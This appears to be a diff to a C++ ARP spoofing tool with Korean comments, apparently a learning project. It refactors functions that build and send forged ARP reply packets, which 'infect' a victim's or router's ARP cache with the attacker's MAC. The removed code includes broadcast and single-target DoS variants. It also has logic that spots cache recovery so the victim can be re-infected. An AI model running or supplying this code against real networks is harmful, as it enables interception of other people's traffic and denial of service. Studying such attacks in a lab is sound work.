@@ -27,6 +27,7 @@ struct SocketGuard {
     operator int() const {return fd;}
 };
 
+// 내 IP를 받아오는 함수
 Ip getMyIp(std::string_view interfaceName) {
     SocketGuard sock;
     struct ifreq ifr;
@@ -35,14 +36,17 @@ Ip getMyIp(std::string_view interfaceName) {
     }
     std::memset(&ifr, 0, sizeof(ifr));
     std::memcpy(ifr.ifr_name, interfaceName.data(), interfaceName.length()); // strncpy는 다르게 마지막에 널문자를 확실하게 붙여주기위한 memset->memcpy
-    if (ioctl(sock, SIOCGIFADDR, &ifr) < 0) {
+    if (ioctl(sock, SIOCGIFADDR, &ifr) < 0) { // 하드웨어의 제어와 상태 정보를 얻기 위해 제공되는 함수인 ioctl을 사용, 에러 발생시 -1을 리턴한다
         throw std::runtime_error("Failed to get IP address for " + std::string(interfaceName));
     }
+    // 네트워크 바이트 오더를 호스트 바이트 오더로 변경
+    // ioctl에서 ifr구조체에 담은 정보에서 src_addr을 사용
     return Ip(ntohl(((struct sockaddr_in*)&ifr.ifr_addr)->sin_addr.s_addr));
 }
 
+// 패킷을 보내기 위한 메서드
 bool sendPacket(pcap_t *handle, const u_char *packet, size_t packetSize) {
-    int res = pcap_sendpacket(handle, packet, packetSize);
+    int res = pcap_sendpacket(handle, packet, (int)packetSize);
     if (res != 0) {
         std::cerr << "pcap_sendpacket error return " << res << " : " << pcap_geterr(handle) << std::endl;
         return false;
@@ -77,7 +81,11 @@ Mac get_mac(pcap_t *handle, const u_char *packet, size_t packetSize, Ip target_i
     return Mac::nullMac();
 }
 
-// 감염 패킷 생성(ARP Reply사용)
+
+// 감염 패킷 생성(ARP Reply사용) : 라우터 감염일지, 상대방 감염일지는 주소 조절해서 선택
+// 라우터 감염일 경우 :
+// 브로드캐스트 감염일 경우 :
+// 단일 타겟 감염일 경우 :
 EthArpPacket Make_Infection_Packet(Mac attacker_mac, Mac sender_mac, Ip sender_ip, Ip target_ip) {
     EthArpPacket packet;
     packet.eth_.dmac_ = sender_mac;
@@ -91,15 +99,15 @@ EthArpPacket Make_Infection_Packet(Mac attacker_mac, Mac sender_mac, Ip sender_i
 
     packet.arp_.op_ = htons(ArpHdr::Reply);
 
-    packet.arp_.smac_ = attacker_mac;       // 공격자(나)의 Mac
-    packet.arp_.sip_ = htonl(target_ip); // 속일 IP (여기서는 라우터)
-    packet.arp_.tmac_ = sender_mac;         // 받는 사람 Mac
-    packet.arp_.tip_  = htonl(sender_ip);          // 받는 사람 Ip
+    packet.arp_.smac_ = attacker_mac;        // 공격자(나)의 Mac
+    packet.arp_.sip_ = htonl(target_ip);  // 속일 IP (여기서는 라우터)
+    packet.arp_.tmac_ = sender_mac;          // 받는 사람 Mac
+    packet.arp_.tip_  = htonl(sender_ip); // 받는 사람 Ip
 
     return packet;
 }
 
-// 탐색(Mac Resolution)용 패킷 생성
+// 탐색(Mac Resolution)용 패킷 생성 : 주변 기기들의 Mac주소를 얻어옴
 EthArpPacket Make_Normal_Packet(Mac attacker_mac, Ip attacker_ip, Ip target_ip) {
     EthArpPacket packet;
 
@@ -121,77 +129,8 @@ EthArpPacket Make_Normal_Packet(Mac attacker_mac, Ip attacker_ip, Ip target_ip) 
     return packet;
 }
 
-// 상대방(엣지 디바이스) 감염
-EthArpPacket Sender_Infection(char *interfaceName, Mac my_mac, Mac SenderMac, Ip sip, Ip tip)
-{
-    return Make_packet(interfaceName, SenderMac, my_mac, my_mac, tip, SenderMac, sip);;
-}
-
-// 라우터(공유기) 감염
-EthArpPacket Target_Infection(char *interfaceName, Mac my_mac, Mac Target_Mac, Ip sip, Ip tip)
-{
-    EthArpPacket packet;
-    packet = Make_packet(interfaceName, Target_Mac, my_mac, my_mac, sip, Target_Mac, tip);
-    return packet;
-}
-
-// Dos를 위한 감염
-EthArpPacket One_Infection(char *interfaceName, Mac my_mac, Mac Sender_Mac, Ip sip, Ip tip)
-{
-    EthArpPacket packet;
-    packet = Make_packet(interfaceName, Sender_Mac, my_mac, my_mac, tip, Sender_Mac, sip);
-    return packet;
-}
-
-// 특정 라우터를 감염시켜 연결된 모든 사용자 Dos
-EthArpPacket Broadcast_Infection(char *interfaceName, Mac my_mac, Ip tip)
-{
-    EthArpPacket packet;
-    packet = Make_packet(interfaceName, Mac::broadcastMac(), my_mac, Mac::randomMac(), tip, Mac::nullMac(), tip);
-    return packet;
-}
-
-// 정상적인 패킷 생성
-EthArpPacket normal_packet(char *interfaceName, Mac my_mac, Ip sip, Ip my_ip)
-{
-    EthArpPacket packet;
-    packet = Make_packet(interfaceName, Mac::broadcastMac(), my_mac, my_mac, my_ip, Mac::nullMac(), sip);
-    return packet;
-}
-
-// 중복되는 패킷만들기를 따로 메서드로 분리
-EthArpPacket Make_packet(char *interfaceName,
-                         Mac eth_dmac,
-                         Mac eth_smac,
-                         Mac arp_smac,
-                         Ip arp_sip,
-                         Mac arp_tmac,
-                         Ip arp_tip)
-{
-
-    EthArpPacket packet;
-
-
-    packet.eth_.dmac_ = eth_dmac; // Sender MAC
-    packet.eth_.smac_ = eth_smac; // 내 MAC
-    packet.eth_.type_ = htons(EthHdr::Arp);
-
-    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
-    packet.arp_.pro_ = htons(EthHdr::Ip4);
-    packet.arp_.hln_ = Mac::SIZE;
-    packet.arp_.pln_ = Ip::SIZE;
-    packet.arp_.op_ = htons(ArpHdr::Request);
-
-    packet.arp_.smac_ = arp_smac;      // 내 MAC
-    packet.arp_.sip_ = htonl(arp_sip); // gateway ip , Input
-    packet.arp_.tmac_ = arp_tmac;      // sender MAC
-    packet.arp_.tip_ = htonl(arp_tip); // sender IP
-
-    return packet;
-}
-
 // 상대방이 지속적으로 날리는 arp패킷(브로드캐스트로 라우터에게 발송하는 패킷이며 라우터에 수신될 경우 감염이 풀리므로 재감염 필요)을 감지
-bool checkRecoverPacket(EthArpPacket &packet, Ip SenderIP, Ip TargetIp, Mac TargetMac, Mac SenderMac)
+bool checkRecoverPacket(const EthArpPacket &packet, Ip SenderIP, Ip TargetIp, Mac TargetMac, Mac SenderMac)
 {
     if (packet.eth_.type() == EthHdr::Arp)
     {
@@ -207,16 +146,4 @@ bool checkRecoverPacket(EthArpPacket &packet, Ip SenderIP, Ip TargetIp, Mac Targ
         }
     }
     return false;
-}
-
-// 만들어진 패킷을 보내는 용도
-void SendInfectionPacket(pcap_t *handle, EthArpPacket packet)
-{
-        // EthArpPacket을 그냥 파라미터로 받아서 보내도록 하자..
-        // ARP Spoofing 패킷 전송
-        int res_sender = pcap_sendpacket(handle, reinterpret_cast<const u_char *>(&packet), sizeof(EthArpPacket));
-        if (res_sender != 0)
-        {
-           fprintf(stderr, "pcap_sendpacket (Sender) return %d error=%s\n", res_sender, pcap_geterr(handle));
-        }
 }
